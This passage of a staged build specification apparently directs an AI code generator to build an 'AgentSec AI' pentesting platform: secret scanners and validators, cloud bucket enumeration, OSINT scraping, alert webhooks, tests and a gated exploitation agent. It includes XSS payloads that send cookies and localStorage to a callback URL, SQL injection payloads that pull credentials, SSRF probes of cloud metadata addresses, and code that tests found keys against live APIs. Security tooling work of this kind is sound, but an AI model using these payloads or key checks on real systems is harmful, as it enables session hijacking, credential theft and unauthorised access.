    For each env/config file found:
      Fetch content
      Run _regex_extract (from JSSecretExtractor)
      
      Additional checks for config files:
        DATABASE_URL pattern → extract DB credentials
        DB_PASSWORD, DB_USER → extract
        MAIL_PASSWORD → extract
        SMTP_PASSWORD → extract
        SECRET_KEY → extract
        DEBUG=True in production → MEDIUM finding

  STEP 4: Analyze SQL dump files
    Filter URLs with .sql, .dump extensions
    For each SQL file:
      Fetch and search for:
        INSERT INTO users → extract credentials
        CREATE USER → extract DB users
        ALTER USER ... IDENTIFIED BY → passwords
        Any email + password column data

_analyze_file(url: str,
              file_type: str,
              scan_id: str) → async → list[SecretFinding]:
  
  Fetch file content (with timeout 30s)
  
  if file_type == "env":
    _parse_env_file(content, url)
  elif file_type in ["json", "yaml", "yml"]:
    _parse_structured_config(content, url)
  elif file_type in ["php", "py", "js", "rb"]:
    Run full _regex_extract(content, url)
  elif file_type == "sql":
    _parse_sql_dump(content, url)
  else:
    Run _regex_extract as fallback

_parse_env_file(content, source_url) → list[SecretFinding]:
  Parse KEY=VALUE pairs
  For each line:
    Skip comments (#) and empty lines
    Split on first = sign
    key = left side
    value = right side (strip quotes)
    
    Flag if key contains:
      PASSWORD, SECRET, KEY, TOKEN, CREDENTIAL,
      AUTH, API, PRIVATE, CERT, PASS
    AND value is not empty and not placeholder:
      (skip: "your_key_here", "changeme", "xxxx",
       "placeholder", "todo", "change_this")
    
    Create SecretFinding:
      secret_type = key.lower()
      title = f"Credential in .env: {key}"
      severity = CRITICAL
      raw_match = value[:4] + "..." (truncated)
      source_url = source_url

_parse_structured_config(content, url) → list[SecretFinding]:
  Try json.loads or yaml.safe_load
  Recursively walk the structure:
    For each key-value pair:
      If key matches secret patterns (same as env):
        Create SecretFinding
  Handles nested dicts and lists

Generate file_secret_scanner.py only. Stop after.
```

---

### Step 7.5 — Secret Validator

```
PHASE 7 — STEP 5

Generate: backend/workers/processors/secret_validator.py

Extraction from claude-bug-bounty:
  Reference tools/claude-bug-bounty/ for its secret
  validation methodology.
  Rewrite as async Python class.
  Do NOT import from tools/.

SecretValidator class:

validate_all(findings: list[SecretFinding],
             scan_id: str) → async → list[SecretFinding]

  validated = []
  
  For each finding:
    result = await validate_single(finding)
    if result.should_keep:
      finding.is_verified = result.is_active
      finding.verification_result = result.details
      finding.severity = result.adjusted_severity
      validated.append(finding)
  
  deduplicated = _deduplicate(validated)
  Return deduplicated

ValidationResult dataclass:
  should_keep: bool
  is_active: bool (key actually works)
  adjusted_severity: str
  details: str

validate_single(finding: SecretFinding) → async → ValidationResult:

  secret_type = finding.secret_type
  
  if secret_type == "aws_access_key":
    return await _validate_aws(finding)
  
  elif secret_type == "google_api_key":
    return await _validate_google(finding)
  
  elif secret_type == "github_token":
    return await _validate_github(finding)
  
  elif secret_type == "stripe_key":
    return await _validate_stripe(finding)
  
  elif secret_type == "slack_token":
    return await _validate_slack(finding)
  
  elif secret_type == "firebase_url":
    return await _validate_firebase(finding)
  
  elif secret_type in ["generic_password", "generic_secret"]:
    return _validate_generic(finding)
  
  else:
    return ValidationResult(
      should_keep=True,
      is_active=False,
      adjusted_severity=finding.severity,
      details="Unverified — manual review required"
    )

_validate_aws(finding) → async → ValidationResult:
  raw_key = finding.raw_match
  
  If raw_match is truncated (ends with ...):
    Cannot validate — mark unverified
    Return ValidationResult(should_keep=True,
      is_active=False,
      details="Key truncated — manual verification needed")
  
  Try:
    GET https://sts.amazonaws.com/
      ?Action=GetCallerIdentity
      &Version=2011-06-15
    With AWS Signature headers using the found key
    
    If 200: key is ACTIVE
      Return ValidationResult(
        should_keep=True, is_active=True,
        adjusted_severity="CRITICAL",
        details=f"AWS key is ACTIVE. Account: {response_account_id}"
      )
    
    If 403 (InvalidClientTokenId):
      Key exists but invalid
      Return ValidationResult(
        should_keep=True, is_active=False,
        adjusted_severity="HIGH",
        details="AWS key exists but is invalid/revoked"
      )
  
  Except any error:
    Return unverified ValidationResult
  
  NOTE: NEVER use the key to perform any actions.
  Only call GetCallerIdentity (read-only, safe validation).

_validate_google(finding) → async → ValidationResult:
  Try:
    GET https://www.googleapis.com/oauth2/v1/tokeninfo
      ?access_token={key}
    
    If 200: key is active
      adjusted_severity = CRITICAL
    If 400: key invalid
      adjusted_severity = HIGH (still report it)
  
  Return ValidationResult accordingly

_validate_github(finding) → async → ValidationResult:
  Try:
    GET https://api.github.com/user
    Header: Authorization: token {key}
    
    If 200: token is active
      Extract username from response
      adjusted_severity = CRITICAL
      details = f"GitHub token ACTIVE for user: {username}"
    If 401: token invalid
      adjusted_severity = HIGH
  
  Return ValidationResult

_validate_stripe(finding) → async → ValidationResult:
  key = full raw match (stripe keys are long, check if full)
  
  Try:
    GET https://api.stripe.com/v1/charges
      ?limit=1
    Header: Authorization: Bearer {key}
    
    If 200: key is ACTIVE
      CRITICAL if sk_live_ prefix (production)
      HIGH if sk_test_ prefix (test mode)
    If 401: invalid
  
  NOTE: This is a read-only API call.

_validate_slack(finding) → async → ValidationResult:
  Try:
    GET https://slack.com/api/auth.test
    Header: Authorization: Bearer {token}
    
    If ok==true in response: ACTIVE
    Else: invalid
  
  Return ValidationResult

_validate_firebase(finding) → async → ValidationResult:
  Try:
    GET {firebase_url}/.json?shallow=true
    
    If 200 (not null): database is PUBLIC
      severity = CRITICAL
      details = "Firebase database is publicly readable"
    If 401: auth required (correct behavior)
      severity = LOW
      details = "Firebase URL exposed but auth required"
    If 200 but null: empty database
      severity = LOW

_validate_generic(finding) → ValidationResult:
  Rules for generic secrets (no API to verify):
  
  Keep and mark HIGH if:
    value length > 20 characters
    NOT a known placeholder
    contains mix of case + numbers
  
  Drop (should_keep=False) if:
    value is common placeholder:
      "your_secret_here", "changeme", "xxxx",
      "example", "placeholder", "test",
      "password123", "secret123"
    value < 8 characters
    value is all same character
  
  Return ValidationResult(should_keep=True/False, ...)

_deduplicate(findings) → list[SecretFinding]:
  Deduplicate by (secret_type, raw_match[:8])
  If same key found in multiple files:
    Keep the one with highest severity
    Merge source_url into single finding as list

Generate secret_validator.py only. Stop after.
```

---

### Step 7.6 — Cloud Security Module

```
PHASE 7 — STEP 6

Generate: backend/workers/modules/cloud_security_module.py

CloudSecurityModule class:

run(scan_id: str,
    context: ScanContext,
    db: AsyncSession) → async → list[CloudFinding]

  asyncio.gather():
    _scan_s3_buckets(scan_id, context)
    _scan_azure_blobs(scan_id, context)
    _scan_gcp_buckets(scan_id, context)
    _check_cloud_metadata_ssrf(scan_id, context)
    _enumerate_cloud_services(scan_id, context)
  
  Collect all results, return flat list

_scan_s3_buckets(scan_id, context) → async:
  
  STEP 1: Generate bucket name candidates
    base = context.target.replace(".", "-")
    org = extract_org_name(context.target)
    
    candidates = generate_bucket_names(base, org)
    
    def generate_bucket_names(base, org):
      return [
        base, f"{base}-backup", f"{base}-prod",
        f"{base}-staging", f"{base}-dev",
        f"{base}-assets", f"{base}-media",
        f"{base}-uploads", f"{base}-static",
        f"{base}-data", f"{base}-files",
        f"{org}", f"{org}-backup", f"{org}-assets",
        f"{org}-prod", f"{org}-dev", f"{org}-staging",
        f"backup-{org}", f"data-{org}",
        f"{org}-bucket", f"{org}-store"
      ]
  
  STEP 2: Write candidates to temp file
    /tmp/agentsec_{scan_id}_s3_buckets.txt
  
  STEP 3: Run S3Scanner plugin
    s3scanner_plugin with:
      buckets_file = temp file
      threads = 20
  
  STEP 4: For each found public bucket
    Create CloudFinding:
      title = "Public AWS S3 Bucket Exposed"
      severity = HIGH if read-only
      severity = CRITICAL if read+write
      owasp = "A02:2025"
      evidence = bucket URL + object count
    
    If bucket is writable:
      Create separate CRITICAL finding:
        title = "Writable S3 Bucket — Data Tampering Risk"

_scan_azure_blobs(scan_id, context) → async:
  Run cloud_enum_plugin with:
    keyword = org name
    azure only mode
  
  Also directly probe common Azure blob URLs:
    https://{org}.blob.core.windows.net/{container}
    Try containers: backup, public, media, assets,
                    uploads, data, files, storage
  
  For each accessible blob container:
    Try to list: GET {container_url}?restype=container&comp=list
    If 200 and XML returned → CRITICAL (public listing)
    If 200 but no listing → HIGH (accessible but no list)

_scan_gcp_buckets(scan_id, context) → async:
  Run cloud_enum_plugin for GCP
  
  Also directly probe:
    https://storage.googleapis.com/{bucket_name}
    https://{bucket_name}.storage.googleapis.com
  
  For each accessible GCP bucket:
    Try: GET https://storage.googleapis.com/{bucket}?list
    If returns XML with Contents → CRITICAL

_check_cloud_metadata_ssrf(scan_id, context) → async:
  This checks if SSRF findings from Phase 6 can reach
  cloud metadata endpoints.
  
  Load SSRF findings from DB for this scan_id
  
  If any SSRF finding exists with confirmed access:
    Create escalated finding:
      title = "SSRF → Cloud Metadata Access Possible"
      severity = CRITICAL
      evidence = "SSRF confirmed. Cloud metadata at 169.254.169.254 may be accessible"
      owasp = "A01:2025"
      remediation = "Block outbound requests to 169.254.169.254 from application"
  
  Also check if any endpoint accepts URL parameters
  targeting internal IPs:
    Test: ?url=http://169.254.169.254/latest/meta-data/
    Test: ?url=http://metadata.google.internal/
    Test: ?url=http://169.254.169.254/metadata/v1/
  
  If any 200 response contains "ami-id" or "iam" or "instance":
    CRITICAL finding

_enumerate_cloud_services(scan_id, context) → async:
  Run cloud_enum_plugin with full mode:
    AWS: S3, EC2, Lambda, RDS, ElasticSearch, CloudFront
    Azure: Blob, App Service, Functions, SQL
    GCP: Storage, App Engine, Cloud Run, BigQuery
  
  For each discovered cloud service:
    Create CloudFinding (INFO severity if not public)
    Create HIGH severity if public + sensitive data possible

CloudFinding dataclass:
  title: str
  severity: str
  cloud_provider: str (AWS/Azure/GCP)
  resource_type: str (S3/Blob/GCP_Bucket/Lambda/etc)
  resource_url: str
  is_public: bool
  is_writable: bool
  object_count: int | None
  evidence: str
  owasp_category: str
  tool_found_by: str

extract_org_name(target: str) → str:
  "example.com" → "example"
  "api.example.com" → "example"
  "sub.domain.example.co.uk" → "example"
  Strip TLDs properly using tldextract library

Generate cloud_security_module.py only. Stop after.
```

---

### Step 7.7 — OSINT Enricher

```
PHASE 7 — STEP 7

Generate: backend/workers/modules/osint_enricher.py

OSINTEnricher class:

Uses ScrapeGraphAI to extract deep intelligence
about the target organization from public sources.
All data enriches the final report.
Does NOT create Finding records — creates
enrichment data stored in scan metadata.

run(scan_id: str,
    context: ScanContext,
    db: AsyncSession) → async → OSINTData

  STEP 1: Scrape target website
    Run scrapegraph_plugin with:
      target = https://{context.target}
      prompt = """
        Extract the following from this website:
        1. Company name and description
        2. Technology stack mentioned
        3. Team members and their roles
        4. Contact email addresses
        5. Social media links (LinkedIn, Twitter, GitHub)
        6. Job postings (reveal internal tech stack)
        7. API documentation links
        8. Partner integrations mentioned
        9. Cloud services mentioned
        10. Security contact (security@ or HackerOne/Bugcrowd)
        Return as structured JSON.
      """
    
    Store raw result in Scan.scan_config["osint_data"]

  STEP 2: Scrape LinkedIn (public data only)
    If target has LinkedIn URL from STEP 1:
      Run scrapegraph_plugin on LinkedIn page
      prompt = """
        Extract company size, employee count,
        technology keywords from job descriptions,
        engineering team size. Public data only.
        Return as JSON.
      """
    
    technology keywords from job descriptions reveal:
      internal stack (AWS/Azure/GCP preference)
      frameworks in use (React, Vue, Angular)
      databases (PostgreSQL, MongoDB, MySQL)
      DevOps tools (Kubernetes, Docker, Terraform)

  STEP 3: Scrape GitHub organization page
    If github.com/{org} exists:
      Run scrapegraph_plugin on org page
      Extract:
        Public repositories count
        Primary programming languages
        Recent activity (reveals active projects)
        Organization members (if public)

  STEP 4: Check for security.txt
    GET https://{target}/security.txt
    GET https://{target}/.well-known/security.txt
    
    If found:
      Parse for:
        Contact email / URL
        Bug bounty program link
        Preferred language
        PGP key
      
      Create Finding (INFO):
        title = "security.txt Found"
        severity = INFO
        evidence = security.txt content
        note = "Target has responsible disclosure policy"

  STEP 5: Check for bug bounty programs
    Check:
      https://hackerone.com/programs (search for org name)
      https://bugcrowd.com/{org}
      Intigriti, Synack, YesWeHack
    
    Store result in scan metadata:
      has_bug_bounty: bool
      bug_bounty_url: str | None
      scope_url: str | None

  STEP 6: Compile and store OSINT data
    osint_data = OSINTData(
      company_name = ...,
      tech_stack_intel = [...],
      team_members = [...],
      contact_emails = [...],
      social_links = {...},
      job_tech_keywords = [...],
      cloud_preferences = [...],
      has_bug_bounty = ...,
      bug_bounty_url = ...,
      has_security_txt = ...,
      github_org = ...,
      public_repo_count = ...
    )
    
    Store in DB: Scan.scan_config["osint"] = osint_data.dict()
    
    Update Domain record:
      hosting_provider = detected cloud preference
    
    For each new email found:
      Create Finding (INFO):
        title = "Email Address Exposed via OSINT"
        tool_found_by = "scrapegraph_osint"

OSINTData dataclass:
  company_name: str | None
  tech_stack_intel: list[str]
  team_members: list[dict]
  contact_emails: list[str]
  social_links: dict[str, str]
  job_tech_keywords: list[str]
  cloud_preferences: list[str]
  has_bug_bounty: bool
  bug_bounty_url: str | None
  has_security_txt: bool
  github_org: str | None
  public_repo_count: int

Generate osint_enricher.py only. Stop after.
```

---

### Step 7.8 — Immediate Notifier

```
PHASE 7 — STEP 8

Generate: backend/workers/processors/immediate_notifier.py

Sends real-time alerts when critical secrets are found.
Does NOT wait for the report phase.
Fires immediately when Secret Agent finds critical findings.

Extraction from BCHackTool:
  Reference tools/BCHackTool/ for its notification
  trigger logic (Telegram/Slack/Discord webhooks).
  Rewrite as clean async Python class.

ImmediateNotifier class:

notify_critical(scan_id: str,
                findings: list,
                target: str) → async → None

  For each notification channel that is configured:
    Build message
    Send via appropriate method

  Channels checked (all from settings/env):
    Slack: if SLACK_WEBHOOK_URL is set
    Telegram: if TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID set
    Discord: if DISCORD_WEBHOOK_URL is set
    Email: if SMTP settings configured (future)

_send_slack(findings, target, scan_id) → async:
  webhook_url = settings.SLACK_WEBHOOK_URL
  
  message = {
    "text": f"🚨 CRITICAL FINDING — AgentSec AI",
    "attachments": [
      {
        "color": "#FF0000",
        "title": f"Target: {target}",
        "fields": [
          {
            "title": "Scan ID",
            "value": scan_id,
            "short": True
          },
          {
            "title": "Critical Findings",
            "value": str(len(findings)),
            "short": True
          }
        ] + [
          {
            "title": f.title,
            "value": f"Severity: {f.severity}\nURL: {f.affected_url or 'N/A'}",
            "short": False
          }
          for f in findings[:5]
        ],
        "footer": "AgentSec AI — Autonomous Pentesting Platform",
        "ts": current_timestamp
      }
    ]
  }
  
  Use httpx AsyncClient:
    POST webhook_url
    json=message
    timeout=10

_send_telegram(findings, target, scan_id) → async:
  bot_token = settings.TELEGRAM_BOT_TOKEN
  chat_id = settings.TELEGRAM_CHAT_ID
  
  text = (
    f"🚨 *CRITICAL FINDING — AgentSec AI*\n\n"
    f"*Target:* `{target}`\n"
    f"*Scan ID:* `{scan_id}`\n"
    f"*Critical Findings:* {len(findings)}\n\n"
  )
  
  for finding in findings[:5]:
    text += (
      f"━━━━━━━━━━━━━━\n"
      f"*{finding.title}*\n"
      f"Severity: {finding.severity}\n"
      f"URL: {finding.affected_url or 'N/A'}\n\n"
    )
  
  Use httpx AsyncClient:
    POST https://api.telegram.org/bot{token}/sendMessage
    json={
      "chat_id": chat_id,
      "text": text,
      "parse_mode": "Markdown"
    }
    timeout=10

_send_discord(findings, target, scan_id) → async:
  webhook_url = settings.DISCORD_WEBHOOK_URL
  
  embeds = []
  for finding in findings[:5]:
    embeds.append({
      "title": finding.title,
      "color": 15158332,
      "fields": [
        {"name": "Severity", "value": finding.severity, "inline": True},
        {"name": "Target", "value": target, "inline": True},
        {"name": "URL", "value": finding.affected_url or "N/A"}
      ]
    })
  
  message = {
    "content": "🚨 **CRITICAL FINDING — AgentSec AI**",
    "embeds": embeds,
    "username": "AgentSec AI"
  }
  
  POST webhook_url json=message

Rate limit protection:
  Use Redis to prevent duplicate notifications:
    Key: agentsec:notified:{scan_id}:{finding_hash}
    TTL: 3600
    Only send if key does not exist
  This prevents spamming if agent retries

Error handling:
  All notification sends wrapped in try/except
  Notification failure NEVER crashes the agent
  Log warning on failure, continue

Generate immediate_notifier.py only. Stop after.
```

---

### Step 7.9 — Phase 7 Verification

```
PHASE 7 — STEP 9 — FINAL VERIFICATION

Phase 7 complete. Write tests/test_secret_agent.py

Test cases:

1. test_regex_extractor_finds_aws_key
   Content = "const key = 'AKIAIOSFODNN7EXAMPLE'"
   Assert: aws_access_key finding created
   Assert: raw_match truncated to first 8 chars + "..."
   Assert: severity == CRITICAL

2. test_regex_extractor_skips_placeholder
   Content = "const password = 'your_password_here'"
   Assert: no finding created (placeholder detected)

3. test_regex_extractor_finds_jwt
   Content with eyJ... JWT token in JS
   Assert: jwt_token finding created
   Assert: severity == HIGH

4. test_regex_extractor_finds_private_key
   Content with "-----BEGIN RSA PRIVATE KEY-----"
   Assert: private_key finding created
   Assert: severity == CRITICAL

5. test_secret_validator_filters_placeholder
   SecretFinding with raw_match = "changeme"
   Assert: should_keep == False

6. test_secret_validator_keeps_real_secret
   SecretFinding with 40-char mixed-case value
   Assert: should_keep == True

7. test_secret_deduplication
   Same (secret_type, raw_match[:8]) from 2 files
   Assert: only 1 finding in validated output

8. test_git_exposed_finds_config
   Mock httpx: /.git/config returns 200 with content
   Assert: Finding created with severity CRITICAL
   Assert: title contains ".git Repository"

9. test_s3_bucket_name_generation
   target = "example.com"
   candidates = generate_bucket_names("example", "example")
   Assert: "example-backup" in candidates
   Assert: "example-prod" in candidates
   Assert: len(candidates) >= 15

10. test_cloud_module_public_s3
    Mock S3Scanner to return 1 public bucket
    Assert: CloudFinding created with severity HIGH
    Assert: owasp == "A02:2025"

11. test_cloud_module_writable_s3
    Mock S3Scanner to return 1 writable bucket
    Assert: 2 findings created (public + writable)
    Assert: writable finding severity == CRITICAL

12. test_immediate_notifier_slack
    Mock httpx POST to return 200
    Call notify_critical with 1 critical finding
    Assert: POST called with correct webhook URL
    Assert: message contains finding title

13. test_immediate_notifier_rate_limit
    Call notify_critical twice for same finding
    Assert: httpx POST called only once (second blocked by Redis key)

14. test_secrets_agent_fires_complete_event
    Mock all scanners to return empty results
    Run full secrets agent
    Assert: SecretsCompleteEvent published
    Assert: Redis key agentsec:secrets_complete:{id} set

15. test_secrets_agent_parallel_flag_coordination
    Set agentsec:vuln_complete:{scan_id} in Redis
    Complete secrets agent
    Assert: Orchestrator.on_all_phase_complete() called
    (because both flags now set)

Run: pytest tests/test_secret_agent.py -v
All 15 must pass. Phase 7 only complete when all pass.
```

---
---

# PHASE 8 — EXPLOITATION AGENT

---

### Step 8.0 — Phase 8 Master Context

```
PHASE 8 — EXPLOITATION AGENT

Phases 0-7 complete.
Now building the most sensitive agent in the pipeline.

CRITICAL RULES FOR THIS PHASE:
1. This agent NEVER runs by default
2. It ONLY triggers when:
   a. Scan config has: exploit_mode = True (user opted in)
   b. AND at least one CRITICAL finding exists
   c. AND finding is of exploitable type (XSS, RCE, SQLi)
3. It is entirely plugin-based and isolated
4. It performs DEMONSTRATION-level exploitation only
   (no actual damage, no data exfiltration)
5. All exploitation is logged to DB with full evidence
6. Exploitation target must be confirmed in-scope
7. A human-readable PoC is generated, not automated attack

This agent covers:
  A. XSS → Session Hijacking (SHVE integration)
  B. PoC Generator (creates proof-of-concept scripts)
  C. Evidence Collector (screenshots + request/response)
  D. Impact Demonstrator (shows what an attacker COULD do)
  E. Exploit Chain Executor (runs A→B→C chains safely)

Extraction from SHVE repo:
  Read: tools/Session-Hijacking-Visual-Exploitation/
  Extract:
    Payload generator logic → ExploitPayloadGenerator class
    JS injection server approach → MockCallbackServer class
    Cookie theft demonstration → SessionHijackDemonstrator class
    Browser control logic → reference only, not reuse
  
  Rewrite ALL of it in:
    backend/workers/modules/exploit/
  
  Do NOT import from tools/Session-Hijacking-Visual-Exploitation/
  Do NOT expose any SHVE code directly.
  Rewrite it clean as AgentSec AI internal classes.

Architecture rules:
  - Exploit Agent is subscribed to exploit_queue
  - Orchestrator dispatches it ONLY on condition check
  - Each exploitation module is a separate class
  - Every action is logged to AuditLog table
  - All payloads are NON-DESTRUCTIVE by design
  - Agent can be disabled entirely via settings:
      EXPLOIT_AGENT_ENABLED = False (default)
  - Evidence collected → stored as files in:
      /tmp/agentsec_{scan_id}_evidence/
  - Evidence files referenced in Finding records

Token rule:
Generate in order, wait for "next" between each:
  Step 8.1: Exploit Agent Task (parent)
  Step 8.2: Exploit Condition Checker
  Step 8.3: Exploit Payload Generator (SHVE extraction)
  Step 8.4: XSS Session Hijack Demonstrator
  Step 8.5: PoC Script Generator
  Step 8.6: Evidence Collector
  Step 8.7: Exploit Chain Executor
  Step 8.8: Verification
```

---

### Step 8.1 — Exploit Agent Task

```
PHASE 8 — STEP 1

Generate: backend/workers/exploit_agent.py

Task: exploit.start

@celery_app.task(
  bind=True,
  name="exploit.start",
  queue="exploit_queue",
  max_retries=0,
  soft_time_limit=1800,
  time_limit=2100
)
def start_exploit(self, scan_id: str,
                  context_dict: dict) → dict:
  return asyncio.run(_async_start_exploit(
    self, scan_id, context_dict
  ))

Async implementation _async_start_exploit():

STEP 0: Safety gate — check if enabled
  If not settings.EXPLOIT_AGENT_ENABLED:
    Log: "Exploit Agent is DISABLED. Skipping."
    Return {"status": "disabled", "reason": "EXPLOIT_AGENT_ENABLED=False"}
  
  Log: "Exploit Agent started for scan {scan_id}"
  Log: "WARNING: Exploitation mode active. All actions logged."

STEP 1: Initialize
  Get DB session, EventBus, AuditLogger
  Load ScanContext from context_dict
  
  Update Scan:
    current_phase = "Exploitation (PoC)"
    current_tool = "Exploit Condition Check"
  
  Create evidence directory:
    mkdir /tmp/agentsec_{scan_id}_evidence/

STEP 2: Run condition checker
  checker = ExploitConditionChecker(db)
  eligible_findings = await checker.get_eligible(scan_id)
  
  If not eligible_findings:
    Log: "No exploitable findings found. Skipping exploit phase."
    await _fire_complete(scan_id, findings_exploited=0)
    Return early
  
  Log: f"{len(eligible_findings)} findings eligible for PoC"

STEP 3: Process each finding by type

  exploit_results = []
  
  For each finding in eligible_findings:
    
    Log action to AuditLog:
      {scan_id, finding_id, action: "PoC Attempt",
       severity: finding.severity, url: finding.affected_url}
    
    if finding type is XSS:
      result = await _exploit_xss(finding, scan_id)
    
    elif finding type is SQLi:
      result = await _exploit_sqli(finding, scan_id)
    
    elif finding type is open redirect:
      result = await _exploit_open_redirect(finding, scan_id)
    
    elif finding type is default credentials:
      result = await _exploit_default_creds(finding, scan_id)
    
    elif finding type is subdomain takeover:
      result = await _document_takeover(finding, scan_id)
    
    exploit_results.append(result)
  
  Log each exploit attempt result to AuditLog

STEP 4: Run chain exploits
  chain_executor = ExploitChainExecutor(db, event_bus)
  chain_results = await chain_executor.run(
    scan_id=scan_id,
    findings=eligible_findings,
    exploit_results=exploit_results
  )
  exploit_results.extend(chain_results)

STEP 5: Update findings with PoC evidence
  For each result in exploit_results:
    If result.poc_generated:
      Update Finding record:
        evidence += "\n\n--- PoC ---\n" + result.poc_code
        is_confirmed = True (exploit confirmed finding)
        status = CONFIRMED

STEP 6: Fire completion
  Publish ExploitCompleteEvent(
    scan_id=scan_id,
    exploit_results=[r.to_dict() for r in exploit_results]
  )
  
  Update Scan:
    current_phase = "Reporting"
    current_tool = "Pending"
  
  Log: "Exploit Agent complete. PoC generated for
        {confirmed} findings."
  
  Return summary dict

_exploit_xss(finding, scan_id) → async → ExploitResult:
  module = XSSSessionHijackDemonstrator(event_bus)
  return await module.demonstrate(finding, scan_id)

_exploit_sqli(finding, scan_id) → async → ExploitResult:
  poc_gen = PoCScriptGenerator()
  poc = poc_gen.generate_sqli_poc(finding)
  
  evidence = EvidenceCollector()
  await evidence.capture_request_response(
    url=finding.affected_url,
    payload=poc.payload,
    scan_id=scan_id
  )
  
  Return ExploitResult(
    finding_id=finding.id,
    exploit_type="SQL Injection",
    poc_generated=True,
    poc_code=poc.code,
    evidence_files=evidence.files,
    impact_statement=poc.impact
  )

_exploit_default_creds(finding, scan_id) → async:
  If finding.evidence contains successful login:
    Take screenshot of authenticated state
    Create ExploitResult documenting the access
    severity escalated to CRITICAL in result

_document_takeover(finding, scan_id) → async:
  This is documentation only, no actual takeover
  Generate report showing:
    The dangling CNAME
    The unclaimed service
    The steps an attacker would take
    The impact of a real takeover
  Create ExploitResult with impact_statement

ExploitResult dataclass:
  finding_id: UUID
  exploit_type: str
  poc_generated: bool
  poc_code: str | None
  evidence_files: list[str]
  impact_statement: str
  attacker_scenario: str
  business_risk: str
  remediation_priority: str

Generate exploit_agent.py only. Stop after.
```

---

### Step 8.2 — Exploit Condition Checker

```
PHASE 8 — STEP 2

Generate: backend/workers/modules/exploit/condition_checker.py

ExploitConditionChecker class:

EXPLOITABLE_TYPES = [
  "Cross-Site Scripting",
  "SQL Injection",
  "Server-Side Template Injection",
  "Command Injection",
  "Open Redirect",
  "Default Credentials",
  "Subdomain Takeover",
  "Authentication Bypass",
  "JWT Misconfiguration",
  "SSRF"
]

MINIMUM_SEVERITY = "HIGH"

get_eligible(scan_id: str,
             db: AsyncSession) → async → list[Finding]

  Load all findings for scan_id where:
    severity in [CRITICAL, HIGH]
    is_false_positive == False
    is_confirmed == True OR ai_confidence > 0.7
    title contains any of EXPLOITABLE_TYPES
    affected_url is not None
  
  Apply additional filters:
    _is_safe_to_exploit(finding) == True
    
  Sort by: severity DESC, ai_confidence DESC
  Limit: top 10 findings only
    (prevent excessive exploitation time)
  
  Return filtered list

_is_safe_to_exploit(finding: Finding) → bool:
  Safety checks:
  
  Check 1: URL is in scope
    finding.affected_url must contain scan target domain
    If URL points to external domain: return False
  
  Check 2: Not a production login endpoint
    If "/admin/delete" in url: return False
    If "/api/users/delete" in url: return False
    If HTTP method is DELETE: return False
  
  Check 3: Not a payment endpoint
    If "payment" or "checkout" or "purchase"
      in url: return False
  
  Check 4: Finding has enough evidence to exploit
    finding.evidence must not be None
    finding.affected_url must not be None
  
  Check 5: Target is still alive
    Quick httpx HEAD request to affected_url
    If not 200/301/302: return False
    (target may have gone offline between phases)
  
  Return True if all checks pass

get_chain_candidates(findings: list[Finding]) → list[tuple]:
  Identify findings that can be chained:
  
  Chain 1: XSS + HttpOnly missing
    Find XSS finding + session cookie finding
    Return as tuple: (xss_finding, cookie_finding)
  
  Chain 2: Open Redirect + OAuth
    Find redirect finding + oauth finding
    Return as tuple
  
  Chain 3: SSRF + Cloud Metadata
    Find SSRF + cloud finding
    Return as tuple
  
  Return list of chain tuples

Generate condition_checker.py only. Stop after.
```

---

### Step 8.3 — Exploit Payload Generator

```
PHASE 8 — STEP 3

Generate: backend/workers/modules/exploit/payload_generator.py

Extraction from SHVE repo:
  Reference tools/Session-Hijacking-Visual-Exploitation/
  for its JavaScript payload generation approach.
  REWRITE the payload generation logic from scratch.
  Do NOT copy code. Read the approach, rewrite clean.

ExploitPayloadGenerator class:

PAYLOAD_TEMPLATES dict:

xss_payloads:
  List of XSS payloads from basic to advanced:
  
  basic = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
  ]
  
  cookie_theft = [
    """<script>
    var i=new Image();
    i.src='{{callback_url}}?c='+btoa(document.cookie);
    </script>""",
    
    """<script>
    fetch('{{callback_url}}?data='+btoa(JSON.stringify({
      cookie: document.cookie,
      url: window.location.href,
      storage: JSON.stringify(localStorage)
    })));
    </script>""",
    
    """<script>
    new Image().src='{{callback_url}}?x='
    +encodeURIComponent(document.cookie);
    </script>"""
  ]
  
  dom_xss = [
    "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>",
    "#\"><img src=/ onerror=alert(2)>",
  ]
  
  csp_bypass = [
    "<script src='data:text/javascript,alert(1)'></script>",
    "<object data='data:text/html,<script>alert(1)</script>'></object>",
    "<base href='javascript:alert(1)//'><a href='.'>click</a>",
  ]

sqli_payloads:
  detection = [
    "' OR '1'='1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
  ]
  
  extraction_templates = [
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
  ]

generate_xss_poc(finding: Finding,
                 callback_url: str | None = None) → PoCPayload:
  
  affected_param = finding.affected_parameter or "input"
  affected_url = finding.affected_url
  
  If callback_url provided:
    Use cookie_theft payload template
    Replace {{callback_url}} with actual callback
    poc_type = "cookie_theft"
  Else:
    Use basic alert payload
    poc_type = "detection"
  
  Return PoCPayload(
    payload = selected_payload,
    injection_point = affected_param,
    target_url = affected_url,
    poc_type = poc_type,
    impact = "Attacker can steal session cookies and hijack user sessions",
    curl_command = _build_curl_command(finding, payload),
    python_poc = _build_python_poc(finding, payload),
    description = _describe_xss_impact(finding)
  )

generate_sqli_poc(finding: Finding) → PoCPayload:
  Return PoCPayload with:
    payload = detection payloads
    curl_command = _build_curl_command
    python_poc = _build_python_poc
    impact = "Attacker can extract entire database contents"
    sqlmap_command = f"sqlmap -u '{affected_url}' -p '{param}' --dbs"

_build_curl_command(finding, payload) → str:
  Constructs a curl command demonstrating the exploit:
  
  If GET parameter:
    f"curl -sk '{url}?{param}={urllib.quote(payload)}'"
  
  If POST parameter:
    f"curl -sk -X POST '{url}' -d '{param}={urllib.quote(payload)}'"
  
  Add: -v flag for verbose output in the PoC

_build_python_poc(finding, payload) → str:
  Generate a clean Python requests script:
  
  """
  import requests
  
  # AgentSec AI — Proof of Concept
  # Finding: {finding.title}
  # Severity: {finding.severity}
  # CVE: {finding.cve_id or 'N/A'}
  # OWASP: {finding.owasp_category}
  # 
